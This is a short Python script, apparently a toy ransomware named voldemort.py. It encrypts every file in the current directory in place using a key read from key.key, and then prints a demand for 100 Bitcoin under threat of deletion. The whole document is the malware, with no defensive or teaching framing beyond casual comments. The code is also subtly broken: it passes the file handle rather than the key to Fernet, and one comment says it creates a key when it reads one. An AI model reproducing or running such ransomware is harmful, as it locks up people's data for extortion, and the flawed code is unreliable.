import os
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
	if file == "voldemort.py" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

#next, we are creating an encryption key that we will use to lock up our files.

with open("key.key", "rb") as key:
	secretkey = key.read()


#now for the fun part, we are using a for loop to go through every file in our list
#and encrypting the file with our new encryption key

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)



print("All of your files have been encrypted!! Send me 100 Bitcoin or I'll delete them in 24 hours!!")
